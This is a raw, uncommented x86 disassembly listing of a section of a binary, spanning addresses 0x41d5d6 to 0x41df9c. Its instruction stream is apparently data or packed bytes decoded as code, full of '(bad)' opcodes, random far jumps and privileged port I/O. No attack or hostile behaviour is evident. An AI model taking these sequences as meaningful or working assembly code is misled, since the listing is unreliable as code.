  41d5d6:	paddusw mm0,QWORD PTR [ecx]
  41d5d9:	jge    0x41d5f6
  41d5db:	aad    0xa0
  41d5dd:	ins    DWORD PTR es:[edi],dx
  41d5de:	jp     0x41d645
  41d5e0:	and    ah,BYTE PTR [esi]
  41d5e2:	jae    0x41d5d3
  41d5e4:	out    0x36,eax
  41d5e6:	inc    edx
  41d5e7:	adc    BYTE PTR [ebx-0x5ad7416a],ch
  41d5ed:	int3   
  41d5ee:	or     al,0x29
  41d5f0:	jecxz  0x41d64c
  41d5f2:	mov    ss,WORD PTR [ebx]
  41d5f4:	ret    
  41d5f5:	retf   0x43c8
  41d5f8:	pushf  
  41d5f9:	jmp    0x41d5d9
  41d5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5fc:	lods   eax,DWORD PTR ds:[si]
  41d5fe:	retf   
  41d5ff:	mov    WORD PTR fs:[ebx+0x41],fs
  41d603:	in     al,0xf3
  41d605:	je     0x41d62d
  41d607:	std    
  41d608:	or     edx,DWORD PTR [ebx-0x8d907aa]
  41d60e:	xor    al,ah
  41d610:	rol    DWORD PTR [eax],1
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x9366e435
  41d681:	inc    DWORD PTR [ecx-0x3c]
  41d684:	aad    0x38
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0x9f000001
  41d68d:	push   esp
  41d68e:	adc    cl,BYTE PTR [eax-0x11]
  41d691:	cmp    al,bh
  41d693:	pop    esp
  41d694:	xor    ebx,DWORD PTR [esi-0x4e]
  41d697:	cdq    
  41d698:	mov    bl,0xaf
  41d69a:	ins    BYTE PTR es:[edi],dx
  41d69b:	dec    ebp
  41d69c:	adc    DWORD PTR [edi+0x56],esi
  41d69f:	(bad)  [ecx]
  41d6a1:	out    dx,eax
  41d6a2:	mov    esp,0xc8d8add1
  41d6a7:	outs   dx,BYTE PTR ds:[esi]
  41d6a8:	pop    ds
  41d6a9:	add    esi,DWORD PTR [ebx]
  41d6ab:	jno    0x41d6f6
  41d6ad:	mov    edx,0x39bc9229
  41d6b2:	iret   
  41d6b3:	clc    
  41d6b4:	ja     0x41d664
  41d6b6:	in     eax,dx
  41d6b7:	adc    eax,0x74ee4593
  41d6bc:	mov    ds,WORD PTR [edi-0x21]
  41d6bf:	cwde   
  41d6c0:	or     BYTE PTR [esp+ebx*1+0x16],dl
  41d6c4:	lods   eax,DWORD PTR ds:[esi]
  41d6c5:	popa   
  41d6c6:	push   0xffffffdf
  41d6c8:	outs   dx,DWORD PTR ds:[esi]
  41d6c9:	rcr    DWORD PTR [ebx+0x44818eb5],0x94
  41d6d0:	sti    
  41d6d1:	mov    ah,0x20
  41d6d3:	sbb    dl,BYTE PTR [esi+0x7a656dda]
  41d6d9:	sub    al,0xd3
  41d6db:	je     0x41d69c
  41d6dd:	inc    edx
  41d6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6df:	xor    esi,DWORD PTR [ecx-0x1a]
  41d6e2:	outs   dx,DWORD PTR ds:[esi]
  41d6e3:	or     ebx,DWORD PTR [esi]
  41d6e5:	fwait
  41d6e6:	add    DWORD PTR ds:0x35e963eb,eax
  41d6ec:	xchg   esp,eax
  41d6ed:	daa    
  41d6ee:	dec    ebx
  41d6ef:	dec    esp
  41d6f0:	cli    
  41d6f1:	test   BYTE PTR [edx],0x28
  41d6f4:	mov    WORD PTR [edx+0x19],cs
  41d6f7:	hlt    
  41d6f8:	xchg   DWORD PTR [ebx],edx
  41d6fa:	ins    DWORD PTR es:[edi],dx
  41d6fb:	data16 mov cl,0xb1
  41d6fe:	mov    ah,0xe5
  41d700:	loope  0x41d72c
  41d702:	xor    edx,DWORD PTR ss:[edx+0x57c0d944]
  41d709:	inc    ecx
  41d70a:	jne    0x41d690
  41d70c:	jns    0x41d6d6
  41d70e:	dec    edx
  41d70f:	xchg   edx,eax
  41d710:	mov    dl,0xa5
  41d712:	leave  
  41d713:	cmc    
  41d714:	and    al,0xd3
  41d716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d717:	pinsrw mm5,WORD PTR [eax+ebx*1],0xd
  41d71c:	das    
  41d71d:	loope  0x41d6be
  41d71f:	inc    edx
  41d720:	in     al,dx
  41d721:	retw   
  41d723:	cmp    dl,BYTE PTR [eax-0x57]
  41d726:	push   ecx
  41d727:	mov    cl,0x2a
  41d729:	or     edx,DWORD PTR ds:0x80a62647
  41d72f:	dec    eax
  41d730:	mov    eax,ds:0x8ccd3309
  41d735:	hlt    
  41d736:	(bad)  
  41d737:	call   DWORD PTR [eax]
  41d739:	fstp   TBYTE PTR [eax-0x36]
  41d73c:	adc    al,0x96
  41d73e:	in     eax,0x27
  41d740:	(bad)  
  41d741:	pop    esp
  41d742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d743:	not    BYTE PTR [eax-0x5f9074b8]
  41d749:	ins    DWORD PTR es:[edi],dx
  41d74a:	stc    
  41d74b:	jmp    0xcc0c:0xcd653066
  41d752:	repnz das 
  41d754:	call   0x363a46d2
  41d759:	in     eax,0xd4
  41d75b:	aad    0x95
  41d75d:	outs   dx,DWORD PTR ds:[esi]
  41d75e:	cmp    BYTE PTR [ebx-0x53],bl
  41d761:	fcmovb st,st(1)
  41d763:	push   edx
  41d764:	jbe    0x41d797
  41d766:	cmc    
  41d767:	and    bl,cl
  41d769:	(bad)  
  41d76a:	int    0x26
  41d76c:	xchg   ecx,eax
  41d76d:	lds    ebx,FWORD PTR [ebx+0x22]
  41d770:	shl    DWORD PTR [ecx-0x24],0x80
  41d774:	or     al,0xf
  41d776:	rol    BYTE PTR [edx-0x12],cl
  41d779:	scas   eax,DWORD PTR es:[edi]
  41d77a:	lods   eax,DWORD PTR ds:[esi]
  41d77b:	out    0xe2,eax
  41d77d:	test   DWORD PTR [ebx],ebx
  41d77f:	push   ecx
  41d780:	dec    ebp
  41d781:	outs   dx,DWORD PTR ds:[esi]
  41d782:	arpl   WORD PTR ds:0xa2f3243b,bp
  41d788:	or     al,0xb3
  41d78a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d78b:	(bad)  
  41d78c:	jg     0x41d7e9
  41d78e:	adc    al,0x61
  41d790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	idiv   BYTE PTR [ecx-0x66]
  41d803:	inc    edi
  41d804:	fidivr DWORD PTR [ecx]
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    eax,0xfd000001
  41d80d:	into   
  41d80e:	push   cs
  41d80f:	dec    eax
  41d810:	push   edi
  41d811:	xchg   ecx,eax
  41d812:	outs   dx,BYTE PTR ds:[esi]
  41d813:	int3   
  41d814:	xor    al,BYTE PTR [ebx+0x3d9b651b]
  41d81a:	fnstsw WORD PTR [ecx-0x6cde64de]
  41d820:	fdivr  DWORD PTR [esi]
  41d822:	rcr    BYTE PTR [eax-0x6348eb2d],cl
  41d828:	push   eax
  41d829:	push   ebx
  41d82a:	fs aaa 
  41d82c:	pop    ss
  41d82d:	cmp    BYTE PTR [edi+0x33],dl
  41d830:	aas    
  41d831:	jmp    0x41d89f
  41d833:	frstor [edx]
  41d835:	fistp  DWORD PTR [ebx-0x20e230f1]
  41d83b:	call   0xaa0d3b65
  41d840:	push   ds
  41d841:	cwde   
  41d842:	shl    BYTE PTR [esi-0x7],0x12
  41d846:	icebp  
  41d847:	push   ss
  41d848:	pop    es
  41d849:	rcr    dh,0xe2
  41d84c:	clc    
  41d84d:	imul   esi,DWORD PTR [edi-0x38],0x55
  41d851:	call   0xbbff977f
  41d856:	xor    BYTE PTR [eax],bh
  41d858:	inc    edx
  41d859:	ficom  DWORD PTR [edx]
  41d85b:	int    0xa9
  41d85d:	sub    ch,cl
  41d85f:	fiadd  WORD PTR [esi]
  41d861:	aaa    
  41d862:	ins    BYTE PTR es:[edi],dx
  41d863:	jns    0x41d80e
  41d865:	jl     0x41d871
  41d867:	lahf   
  41d868:	out    dx,eax
  41d869:	pop    ss
  41d86a:	mov    ebp,0x59a9cd2
  41d86f:	push   ecx
  41d870:	ret    
  41d871:	cmp    esi,esi
  41d873:	hlt    
  41d874:	inc    eax
  41d875:	test   DWORD PTR [edi],edi
  41d877:	dec    ecx
  41d878:	mov    bl,0x9e
  41d87a:	xchg   dh,dh
  41d87c:	fsubr  DWORD PTR [eax]
  41d87e:	mov    edi,0x4e9b930b
  41d883:	sub    BYTE PTR [esi-0x7f1eddbe],ah
  41d889:	mov    al,ds:0x5a821441
  41d88e:	cmp    al,0xe0
  41d890:	inc    edx
  41d891:	cwde   
  41d892:	jmp    esp
  41d894:	retf   0x9d0c
  41d897:	aad    0xf4
  41d899:	cdq    
  41d89a:	pop    ds
  41d89b:	xor    BYTE PTR [eax+ebp*1+0x40],bl
  41d89f:	scas   al,BYTE PTR es:[edi]
  41d8a0:	xchg   esp,eax
  41d8a1:	inc    eax
  41d8a2:	retf   
  41d8a3:	jle    0x41d918
  41d8a5:	mov    edx,0xffa04728
  41d8aa:	cli    
  41d8ab:	and    ebx,DWORD PTR [edx+edx*1]
  41d8ae:	xor    esp,eax
  41d8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b1:	mov    ch,0x20
  41d8b3:	test   eax,0x7aed428d
  41d8b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b9:	xor    bl,BYTE PTR [ebp+0x18]
  41d8bc:	idiv   BYTE PTR [edx]
  41d8be:	lods   al,BYTE PTR ds:[esi]
  41d8bf:	cmp    dl,BYTE PTR [edi+ebx*4-0x73]
  41d8c3:	push   edx
  41d8c4:	lahf   
  41d8c5:	rcl    cl,0x31
  41d8c8:	add    eax,0x55609d0a
  41d8cd:	pop    edx
  41d8ce:	mov    bl,0x3e
  41d8d0:	sub    ebx,edi
  41d8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8d3:	imul   ebx,DWORD PTR [esi],0x74
  41d8d6:	mov    ss:0xc53ef974,al
  41d8dc:	rol    DWORD PTR [ecx-0x59325f15],1
  41d8e2:	repnz aas 
  41d8e4:	pop    ecx
  41d8e5:	(bad)  
  41d8e6:	jne    0x41d91c
  41d8e8:	cmp    esi,DWORD PTR [eax+ebx*2-0x1ca97c8f]
  41d8ef:	outs   dx,DWORD PTR ds:[esi]
  41d8f0:	xchg   DWORD PTR [ecx],eax
  41d8f2:	jle    0x41d8cd
  41d8f4:	inc    esp
  41d8f5:	cdq    
  41d8f6:	pushf  
  41d8f7:	and    ch,BYTE PTR [edi-0x2421b1d8]
  41d8fd:	pushf  
  41d8fe:	pusha  
  41d8ff:	repz shl BYTE PTR [edi],0x9b
  41d903:	nop
  41d904:	mov    cl,0x10
  41d906:	jp     0x41d8e8
  41d908:	cld    
  41d909:	inc    ebx
  41d90a:	popa   
  41d90b:	mov    ebx,0x1535f670
  41d910:	in     eax,dx
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	mov    gs:0xdfac8a9d,al
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR ds:0x8e000001,al
  41d98d:	daa    
  41d98e:	jns    0x41d91e
  41d990:	std    
  41d991:	lods   eax,DWORD PTR ds:[esi]
  41d992:	pop    esi
  41d993:	or     ecx,esi
  41d995:	stc    
  41d996:	sbb    DWORD PTR [eax-0x31],eax
  41d999:	fisub  DWORD PTR [ebp-0x34]
  41d99c:	add    DWORD PTR [esi+0x79],ebp
  41d99f:	pop    es
  41d9a0:	add    eax,0xb52d8c43
  41d9a5:	cmp    DWORD PTR [eax+0x4f],ebx
  41d9a8:	aas    
  41d9a9:	xchg   edx,eax
  41d9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ab:	mov    ebx,0x848afdb4
  41d9b0:	sub    eax,0xbec5c6ca
  41d9b5:	or     eax,0x5dcaff26
  41d9ba:	jl     0x41d963
  41d9bc:	cmp    al,0x65
  41d9be:	jge    0x41d9a7
  41d9c0:	adc    edi,DWORD PTR [ebx-0x433945ae]
  41d9c6:	adc    al,0x10
  41d9c8:	rcr    BYTE PTR [edi+0x9be48f3],0x26
  41d9cf:	xor    DWORD PTR [eax+edi*8],ecx
  41d9d2:	jle    0x41da49
  41d9d4:	inc    edx
  41d9d5:	xchg   ebx,eax
  41d9d6:	dec    ebp
  41d9d7:	clc    
  41d9d8:	(bad)  
  41d9d9:	xchg   edx,eax
  41d9da:	mov    edi,0x4153be45
  41d9df:	test   eax,0xa1955a6f
  41d9e4:	jb     0x41da32
  41d9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9e7:	fadd   DWORD PTR [ebx-0x27c1139a]
  41d9ed:	leave  
  41d9ee:	xchg   DWORD PTR [esp+ebx*8],ecx
  41d9f1:	dec    esi
  41d9f2:	call   0x58ce6a44
  41d9f7:	add    ebp,ebp
  41d9f9:	and    BYTE PTR [edx-0x2ffc9b7c],0xa8
  41da00:	shl    DWORD PTR [ecx-0x1694defd],cl
  41da06:	inc    ebp
  41da07:	cmp    dh,cl
  41da09:	push   eax
  41da0a:	sub    ebp,DWORD PTR [ecx+0x10]
  41da0d:	xor    eax,0xb56eb80a
  41da12:	jg     0x41d9c6
  41da14:	fistp  DWORD PTR [edi+0x50]
  41da17:	inc    edi
  41da18:	sub    DWORD PTR [edi+0x55],edi
  41da1b:	add    ebp,eax
  41da1d:	iret   
  41da1e:	stos   BYTE PTR es:[edi],al
  41da1f:	adc    ch,al
  41da21:	push   edx
  41da22:	jp     0x41d9ef
  41da24:	cmp    DWORD PTR [edx+0x1b23e6cc],ebx
  41da2a:	jg     0x41da8b
  41da2c:	pop    ebp
  41da2d:	xchg   edx,eax
  41da2e:	rcr    BYTE PTR [edx+0x6fcf8588],1
  41da34:	mov    ds:0x1d3bb63c,al
  41da39:	sub    esp,DWORD PTR [ebx-0x9]
  41da3c:	rcl    DWORD PTR [esi],0xdb
  41da3f:	and    BYTE PTR [ebp+0x60b6a08c],al
  41da45:	dec    eax
  41da46:	xchg   esi,eax
  41da47:	out    0x62,al
  41da49:	loopne 0x41da81
  41da4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da4c:	xor    dl,0xdf
  41da4f:	xor    esi,0x4e78e0a7
  41da55:	cld    
  41da56:	ror    BYTE PTR [esi+eiz*2+0x64116408],1
  41da5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da5e:	xor    DWORD PTR [edx+ebx*8-0x69],0x9097b153
  41da66:	repz fst QWORD PTR [eax+0x7d]
  41da6a:	dec    edi
  41da6b:	fs add eax,0x524e32c
  41da71:	mov    eax,ds:0x373c4a95
  41da76:	pushf  
  41da77:	xchg   BYTE PTR [ecx],dh
  41da79:	sbb    eax,0x5f415df
  41da7e:	mov    eax,ds:0x1bf7ef16
  41da83:	outs   dx,BYTE PTR ds:[esi]
  41da84:	jp     0x41da61
  41da86:	mov    al,BYTE PTR [esi]
  41da88:	pop    ds
  41da89:	lods   al,BYTE PTR ds:[esi]
  41da8a:	inc    ebp
  41da8b:	inc    eax
  41da8c:	fdiv   st(7),st
  41da8e:	test   eax,0x1217
	...
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffff8f
  41db01:	cmp    eax,0x3be4cdc1
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xed000001
  41db0d:	(bad)  
  41db0f:	xchg   edi,eax
  41db10:	adc    BYTE PTR [eax],ah
  41db12:	dec    esp
  41db13:	push   ds
  41db14:	fs inc esi
  41db16:	mov    esp,0x874e372e
  41db1b:	inc    ebp
  41db1c:	inc    esi
  41db1d:	pop    edi
  41db1e:	pusha  
  41db1f:	mov    ch,cl
  41db21:	daa    
  41db22:	jnp    0x41daca
  41db24:	dec    ecx
  41db25:	dec    ebp
  41db26:	in     eax,dx
  41db27:	fdivr  QWORD PTR [ecx]
  41db29:	inc    ecx
  41db2a:	xlat   BYTE PTR ds:[ebx]
  41db2b:	and    BYTE PTR [edx-0x5c],bh
  41db2e:	mov    BYTE PTR [edi+0x434a3e5a],ch
  41db34:	mov    esi,0xae5c572f
  41db39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db3a:	retf   
  41db3b:	sbb    bl,dh
  41db3d:	sub    eax,0x50c806b2
  41db42:	imul   ebp,DWORD PTR [ecx-0x5741079f],0xda315bb4
  41db4c:	mov    BYTE PTR [edx],dh
  41db4e:	push   ss
  41db4f:	out    0xf2,eax
  41db51:	sub    BYTE PTR [ecx],cl
  41db53:	scas   al,BYTE PTR es:[edi]
  41db54:	cmp    eax,0xe42f5be3
  41db59:	cmp    al,0xb1
  41db5b:	arpl   WORD PTR cs:[edx+0x3a],bp
  41db5f:	xor    DWORD PTR [edx-0x1d],edi
  41db62:	mov    al,ds:0x150532fc
  41db67:	pop    es
  41db68:	adc    BYTE PTR ds:0xf6b92481,cl
  41db6e:	jmp    0x41db09
  41db70:	call   0x43ae:0x322052f9
  41db77:	loopne 0x41db49
  41db79:	add    cl,BYTE PTR [eax+edi*1+0x4776dc0b]
  41db80:	pop    ebp
  41db81:	mov    ebx,0xcb302ad4
  41db86:	or     al,0x11
  41db88:	jecxz  0x41db68
  41db8a:	add    DWORD PTR [eax+eax*2+0x1c],ebp
  41db8e:	std    
  41db8f:	and    al,0x2d
  41db91:	xchg   edi,eax
  41db92:	push   edi
  41db93:	sahf   
  41db94:	loopne 0x41db6c
  41db96:	inc    edx
  41db97:	sub    al,0x7d
  41db99:	or     BYTE PTR [ebx+0x185cb8c7],cl
  41db9f:	(bad)  
  41dba0:	mov    ebx,0x9aeb52ae
  41dba5:	push   ss
  41dba6:	mov    DWORD PTR [ecx+0x5],edi
  41dba9:	jp     0x41db4f
  41dbab:	mov    esi,0xf2b9e045
  41dbb0:	out    dx,eax
  41dbb1:	test   eax,0x4606501f
  41dbb6:	xor    al,0x80
  41dbb8:	jecxz  0x41dc09
  41dbba:	xchg   edi,eax
  41dbbb:	outs   dx,DWORD PTR ds:[esi]
  41dbbc:	jp     0x41dc34
  41dbbe:	or     DWORD PTR [ecx+edi*4],ebx
  41dbc1:	loopne 0x41dbdb
  41dbc3:	sbb    edx,DWORD PTR ds:0x6b9d803b
  41dbc9:	shr    BYTE PTR [edx],1
  41dbcb:	movaps xmm1,xmm3
  41dbce:	inc    ebp
  41dbcf:	daa    
  41dbd0:	mov    WORD PTR [edi],ss
  41dbd2:	mov    edx,0xfedf6073
  41dbd7:	(bad)  
  41dbd8:	lea    esi,[edi-0x2c0c3f70]
  41dbde:	fwait
  41dbdf:	push   esp
  41dbe0:	in     eax,dx
  41dbe1:	cmp    eax,0x80345e0b
  41dbe6:	aas    
  41dbe7:	sti    
  41dbe8:	out    dx,al
  41dbe9:	xor    DWORD PTR [edi+ecx*2],0xe
  41dbed:	mov    al,ds:0x22431458
  41dbf2:	or     BYTE PTR [edi],0x74
  41dbf5:	fstp   QWORD PTR [edi+edx*2+0x3d007d93]
  41dbfc:	xor    eax,0xf18ca969
  41dc01:	imul   eax,DWORD PTR [edx+0x24a05bd5],0xffffffef
  41dc08:	adc    al,ah
  41dc0a:	push   ebx
  41dc0b:	stos   BYTE PTR es:[edi],al
  41dc0c:	lods   al,BYTE PTR ds:[esi]
  41dc0d:	jb     0x41dc1c
  41dc0f:	inc    edx
  41dc10:	push   ss
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0x1b0d050]
  41dc81:	jo     0x41dc27
  41dc83:	ds jmp 0x541ddc5
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    BYTE PTR [ecx+0x61],ch
  41dc8e:	adc    al,BYTE PTR [ebx-0x3e]
  41dc91:	mov    ecx,0x833b6f71
  41dc96:	icebp  
  41dc97:	cld    
  41dc98:	ins    DWORD PTR es:[edi],dx
  41dc99:	clc    
  41dc9a:	sub    edx,DWORD PTR [ebp+0x42ea1c47]
  41dca0:	mov    al,0x62
  41dca2:	sbb    eax,0x75ac1a4c
  41dca7:	pop    ds
  41dca8:	imul   esp,ecx,0x18
  41dcab:	mov    dh,0xd7
  41dcad:	mov    ds:0xd64a1656,al
  41dcb2:	test   eax,0xe008efc9
  41dcb7:	in     eax,0x47
  41dcb9:	test   eax,0x7098340f
  41dcbe:	fst    QWORD PTR [ebp-0x43]
  41dcc1:	in     eax,0xeb
  41dcc3:	test   eax,0x22ccfb08
  41dcc8:	shl    DWORD PTR [edx+0x5e90bc1d],0xbe
  41dccf:	ja     0x41dcbd
  41dcd1:	push   edx
  41dcd2:	add    eax,0x5ddb9e60
  41dcd7:	lea    ebp,[edx+0x47c42a3f]
  41dcdd:	jge    0x41dcc2
  41dcdf:	push   esp
  41dce0:	retf   
  41dce1:	mov    ebp,DWORD PTR [ecx]
  41dce3:	sbb    esi,ebx
  41dce5:	and    DWORD PTR [eax+0x34a6e104],esi
  41dceb:	xchg   esp,eax
  41dcec:	pusha  
  41dced:	aas    
  41dcee:	cmp    ah,BYTE PTR [ecx]
  41dcf0:	jmp    0x41dce8
  41dcf2:	xlat   BYTE PTR ds:[ebx]
  41dcf3:	mov    al,0x70
  41dcf5:	ror    esp,1
  41dcf7:	sar    DWORD PTR [di-0x635a],1
  41dcfc:	mov    bl,0x67
  41dcfe:	push   edi
  41dcff:	sub    bh,BYTE PTR [esi]
  41dd01:	mov    eax,ds:0xc35f1da5
  41dd06:	pushf  
  41dd07:	dec    ebp
  41dd08:	adc    BYTE PTR [ebx+0x68],0xed
  41dd0c:	mov    eax,DWORD PTR [edx]
  41dd0e:	popa   
  41dd0f:	mov    ah,0x1e
  41dd11:	mov    ecx,ebx
  41dd13:	sbb    eax,0x238fd66b
  41dd18:	lods   al,BYTE PTR ds:[esi]
  41dd19:	in     al,dx
  41dd1a:	or     eax,0xf156f0e5
  41dd1f:	mov    dh,0xd8
  41dd21:	adc    BYTE PTR ds:0xe5a55ed4,bl
  41dd27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd28:	mov    bl,0xfd
  41dd2a:	fadd   QWORD PTR [ebx-0x1278cb56]
  41dd30:	int    0xca
  41dd32:	(bad)  
  41dd33:	cdq    
  41dd34:	mov    eax,ds:0x87e2f8da
  41dd39:	mov    bh,0x7f
  41dd3b:	lods   eax,DWORD PTR ds:[esi]
  41dd3c:	add    dl,BYTE PTR [eax+0xa]
  41dd3f:	cmp    ch,BYTE PTR [esi]
  41dd41:	cmp    eax,edx
  41dd43:	lahf   
  41dd44:	pop    ebp
  41dd45:	push   esp
  41dd46:	mul    DWORD PTR ds:0x7dcfb488
  41dd4c:	xchg   ebp,eax
  41dd4d:	cwde   
  41dd4e:	jmp    0x66f7:0xdb4f5d32
  41dd55:	test   BYTE PTR [esi+0x2bb3a28c],ah
  41dd5b:	mov    esp,0x43b9b410
  41dd60:	arpl   WORD PTR [edx+0x44bdc003],cx
  41dd66:	xor    al,0xc2
  41dd68:	pop    ebp
  41dd69:	add    ch,BYTE PTR [edx]
  41dd6b:	aas    
  41dd6c:	sbb    DWORD PTR [eax+0x3d24d6f1],edi
  41dd72:	mov    esi,0x29dfc1ae
  41dd77:	and    al,0xed
  41dd79:	and    al,0x7f
  41dd7b:	jo     0x41ddf8
  41dd7d:	(bad)  
  41dd7e:	ret    
  41dd7f:	aaa    
  41dd80:	inc    eax
  41dd81:	and    BYTE PTR ds:0x53cec1d1,ah
  41dd87:	sbb    esp,DWORD PTR [ebx]
  41dd89:	test   eax,0x759902f0
  41dd8e:	(bad)  
  41dd8f:	jbe    0x41de0e
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	int3   
  41de01:	imul   edx,DWORD PTR [ebx],0xffffffc4
  41de04:	out    dx,al
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	ins    DWORD PTR es:[edi],dx
  41de0d:	cmp    DWORD PTR [ebp+0x1],ecx
  41de10:	mov    ds:0xca2929d1,eax
  41de15:	jns    0x41de3a
  41de17:	xor    cl,cl
  41de19:	cmp    ch,ch
  41de1b:	cmc    
  41de1c:	xor    al,0xe5
  41de1e:	scas   al,BYTE PTR es:[edi]
  41de1f:	ds jg  0x41ddd5
  41de22:	inc    dh
  41de24:	and    dl,BYTE PTR cs:[edi-0x678b7a0d]
  41de2b:	icebp  
  41de2c:	retf   
  41de2d:	add    al,0x4e
  41de2f:	or     esp,0x62
  41de32:	fcomip st,st(3)
  41de34:	shr    DWORD PTR [edi+0x28af2c4b],cl
  41de3a:	jge    0x41ddcd
  41de3c:	mov    esp,0x6cec3ec
  41de41:	fmul   QWORD PTR [edx]
  41de43:	jg     0x41de9b
  41de45:	xor    BYTE PTR [edi],dh
  41de47:	push   edi
  41de48:	jne    0x41de08
  41de4a:	jmp    0xf8a5c866
  41de4f:	bound  esp,QWORD PTR ds:0x18186ad1
  41de55:	(bad)  
  41de56:	shr    BYTE PTR [esp+eax*2-0x1278dd8d],0xda
  41de5e:	push   0x47
  41de60:	mov    esp,0xc74e7e4f
  41de65:	dec    ecx
  41de66:	sbb    BYTE PTR [eax],dh
  41de68:	and    BYTE PTR [eax+0x3b75b891],dl
  41de6e:	cs or  ch,bl
  41de71:	int3   
  41de72:	and    eax,0xdd7cc919
  41de77:	dec    dx
  41de79:	ret    
  41de7a:	cli    
  41de7b:	dec    esi
  41de7c:	add    edi,esi
  41de7e:	test   eax,0xfc5082b7
  41de83:	mov    eax,ds:0x7333dc1b
  41de88:	cmc    
  41de89:	ja     0x41de32
  41de8b:	or     BYTE PTR [edx+edx*8+0x11],cl
  41de8f:	pop    edx
  41de90:	and    BYTE PTR [eax-0x4f],al
  41de93:	(bad)  
  41de94:	int3   
  41de95:	js     0x41df0f
  41de97:	adc    al,0x83
  41de99:	xchg   ebx,eax
  41de9a:	leave  
  41de9b:	dec    esp
  41de9c:	add    eax,0x5b6e9f83
  41dea1:	push   edx
  41dea2:	dec    edx
  41dea3:	ins    DWORD PTR es:[edi],dx
  41dea4:	xor    eax,0x3890dde4
  41dea9:	sbb    BYTE PTR [ebp-0x2ed1e854],ch
  41deaf:	loopne 0x41defc
  41deb1:	(bad)  
  41deb2:	loop   0x41df32
  41deb4:	push   ds
  41deb5:	pop    ecx
  41deb6:	push   es
  41deb7:	call   0x5e95:0x9d5d00bd
  41debe:	cmp    eax,0x2f51895d
  41dec3:	retf   
  41dec4:	(bad)  
  41dec5:	adc    cl,bl
  41dec7:	lods   eax,DWORD PTR ds:[esi]
  41dec8:	rol    cl,0x5f
  41decb:	jne    0x41dec8
  41decd:	xchg   ecx,ebp
  41decf:	lds    edi,FWORD PTR [eax+0x54]
  41ded2:	dec    esi
  41ded3:	or     DWORD PTR [ebx],ebx
  41ded5:	mov    esi,0x7e6ee3a7
  41deda:	mov    es,WORD PTR [ebp-0x7fb0fb87]
  41dee0:	cmp    BYTE PTR [ebx],cl
  41dee2:	jg     0x41df62
  41dee4:	jno    0x41ded1
  41dee6:	call   DWORD PTR [edi-0x62]
  41dee9:	dec    ebp
  41deea:	scas   eax,DWORD PTR es:[edi]
  41deeb:	pop    esi
  41deec:	mov    es,WORD PTR [edi]
  41deee:	xchg   edi,eax
  41deef:	push   0x8f4a586e
  41def4:	sbb    dl,bh
  41def6:	pop    es
  41def7:	push   esi
  41def8:	aad    0xed
  41defa:	inc    ebx
  41defb:	test   DWORD PTR [ecx+0x66b86435],0x80b0120b
  41df05:	mov    al,ds:0x621ff6fd
  41df0a:	(bad)  
  41df0b:	lock int3 
  41df0d:	add    ch,al
  41df0f:	pop    esi
  41df10:	iret   
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x66759ce9
  41df82:	jle    0x41df25
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x5e000001
  41df8d:	xchg   esi,eax
  41df8e:	push   cs
  41df8f:	shr    DWORD PTR [esp+eax*8],0x7
  41df93:	xchg   esi,eax
  41df94:	xchg   esp,ebp
  41df96:	shl    BYTE PTR [edx-0x6e],0x59
  41df9a:	push   eax
  41df9b:	xchg   ebp,eax
  41df9c:	jp     0x41df58
